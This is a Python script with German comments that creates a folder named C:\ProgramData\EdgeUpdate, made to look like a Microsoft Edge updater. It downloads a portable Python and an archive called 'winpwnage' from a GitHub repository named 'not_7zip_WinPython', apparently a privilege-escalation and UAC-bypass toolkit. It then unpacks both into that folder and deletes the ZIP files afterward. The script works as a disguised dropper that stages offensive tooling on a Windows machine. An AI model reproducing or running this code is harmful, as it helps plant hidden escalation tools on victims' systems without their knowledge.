import os
import requests
import zipfile
import shutil

# Pfade festlegen
folder_path = r"C:\ProgramData\EdgeUpdate"
target_dir_py = r"C:\ProgramData\EdgeUpdate\WPy64-310110"
target_dir_pwn = r"C:\ProgramData\EdgeUpdate\winpwnage"

# Funktion zum Erstellen eines Ordners
def create_folder(path):
    if not os.path.exists(path):
        try:
            os.makedirs(path)
            print(f"Ordner {path} wurde erfolgreich erstellt.")
        except PermissionError:
            print("Zugriff verweigert. Stellen Sie sicher, dass Sie die erforderlichen Administratorrechte haben.")
            exit(1)
        except Exception as e:
            print(f"Ein Fehler ist aufgetreten: {e}")
            exit(1)
    else:
        print(f"Ordner {path} existiert bereits.")

# Funktion zum Herunterladen einer Datei
def download_file(url, path):
    response = requests.get(url, stream=True)
    if response.status_code == 200:
        with open(path, "wb") as file:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
        print(f"{path} wurde erfolgreich heruntergeladen.")
    else:
        print(f"Fehler beim Herunterladen der Datei. Statuscode: {response.status_code}")
        exit(1)

# Funktion zum Entpacken einer ZIP-Datei
def extract_zip(zip_path, target_dir):
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(target_dir)
        print(f"ZIP-Datei {zip_path} wurde erfolgreich nach {target_dir} entpackt.")
    except zipfile.BadZipFile:
        print(f"Fehler: {zip_path} ist keine gültige ZIP-Datei.")
        exit(1)
    except Exception as e:
        print(f"Fehler beim Entpacken der ZIP-Datei: {e}")
        exit(1)

# Funktion zum Verschieben des Inhalts eines Ordners
def move_content(src_folder, dest_folder):
    try:
        for item in os.listdir(src_folder):
            s = os.path.join(src_folder, item)
            d = os.path.join(dest_folder, item)
            if os.path.isdir(s):
                shutil.move(s, d)
            else:
                shutil.move(s, dest_folder)
        print(f"Inhalt von {src_folder} wurde erfolgreich nach {dest_folder} verschoben.")
    except Exception as e:
        print(f"Fehler beim Verschieben des Inhalts: {e}")

# Funktion zum Löschen eines Ordners
def delete_folder(folder):
    try:
        if os.path.exists(folder):
            shutil.rmtree(folder)
            print(f"Ordner {folder} wurde erfolgreich gelöscht.")
        else:
            print(f"Ordner {folder} existiert nicht.")
    except Exception as e:
        print(f"Fehler beim Löschen des Ordners {folder}: {e}")

# Links zu den ZIP-Dateien
portable_py_url = "https://github.com/Deltatoolbox/not_7zip_WinPython/raw/main/portable_py.zip"
portable_py_zip = os.path.join(folder_path, "portable_py.zip")

winpwnage_url = "https://github.com/Deltatoolbox/not_7zip_WinPython/raw/main/winpwnage.zip"
winpwnage_zip = os.path.join(folder_path, "winpwnage.zip")

# 1. Ordner erstellen
create_folder(folder_path)

# 2. Herunterladen der ZIP-Dateien
download_file(portable_py_url, portable_py_zip)
download_file(winpwnage_url, winpwnage_zip)

# 3. Entpacken der ZIP-Dateien
extract_zip(portable_py_zip, folder_path)
extract_zip(winpwnage_zip, folder_path)

# 4. Inhalt verschieben und leere Ordner löschen
portable_py_inner = os.path.join(folder_path, "portable_py", "WPy64-310110")
winpwnage_inner = os.path.join(folder_path, "winpwnage", "winpwnage")

if os.path.exists(portable_py_inner):
    move_content(portable_py_inner, folder_path)
    delete_folder(os.path.join(folder_path, "portable_py"))

if os.path.exists(winpwnage_inner):
    move_content(winpwnage_inner, folder_path)
    delete_folder(os.path.join(folder_path, "winpwnage"))

# Optional: ZIP-Dateien löschen, falls nicht mehr benötigt
if os.path.exists(portable_py_zip):
    os.remove(portable_py_zip)
    print(f"ZIP-Datei {portable_py_zip} wurde gelöscht.")

if os.path.exists(winpwnage_zip):
    os.remove(winpwnage_zip)
    print(f"ZIP-Datei {winpwnage_zip} wurde gelöscht.")
